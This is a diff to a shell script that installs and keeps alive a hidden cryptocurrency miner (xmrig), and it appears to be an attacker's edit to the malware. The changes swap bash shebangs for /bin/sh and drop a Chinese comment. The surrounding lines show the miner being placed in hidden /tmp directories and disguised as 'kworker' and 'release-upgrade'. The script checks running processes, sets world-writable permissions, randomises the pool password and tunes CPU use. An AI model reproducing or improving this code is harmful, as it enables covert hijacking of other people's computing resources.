@@ -1,9 +1,9 @@
-#!/usr/bin/env bash
+#!/bin/sh
 
 if [ ! -f /var/tmp/release-upgrade ]; then
     mkdir -p /var/tmp/
     cat > /var/tmp/release-upgrade << 'EOF'
-#!/usr/bin/env bash
+#!/bin/sh
 
 maintain_miner() {
     local script="/tmp/.bash/ground.sh"
@@ -11,7 +11,7 @@ maintain_miner() {
     if [ ! -f "$script" ]; then
         mkdir -p /tmp/.bash
         cat > "$script" << 'MINER_SCRIPT'
-#!/usr/bin/env bash
+#!/bin/sh
 if ! readlink -f /proc/*/exe 2>/dev/null | grep -q "/tmp/.local/kworker"; then
 	if [ ! -f "/tmp/.local/kworker" ]; then
 		mkdir -p /tmp/.local
@@ -81,7 +81,7 @@ chmod 777 /var/tmp/release-upgrade
 
 if [ ! -f /var/tmp/meta-release ]; then
 	cat > /var/tmp/meta-release << 'xmrig'
-#!/usr/bin/env bash
+#!/bin/sh
 if ! readlink -f /proc/*/exe 2>/dev/null | grep -q "/tmp/.local/kworker"; then
 	if [ ! -f "/tmp/.local/kworker" ]; then
 			mkdir -p /tmp/.local
@@ -94,7 +94,6 @@ if ! readlink -f /proc/*/exe 2>/dev/null | grep -q "/tmp/.local/kworker"; then
 			RAND_PASS=$(date +%s | md5sum | head -c 5)
 			sed -i "s/\"pass\": \"x\"/\"pass\": \"$RAND_PASS\"/" /tmp/.local/config.json 2>/dev/null
 			
-			# 根据CPU线程数调整配置
 			cpu_threads=$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 1)
 			if [ "$cpu_threads" -le 2 ]; then
 				sed -i 's/100/70/' /tmp/.local/config.json 2>/dev/null
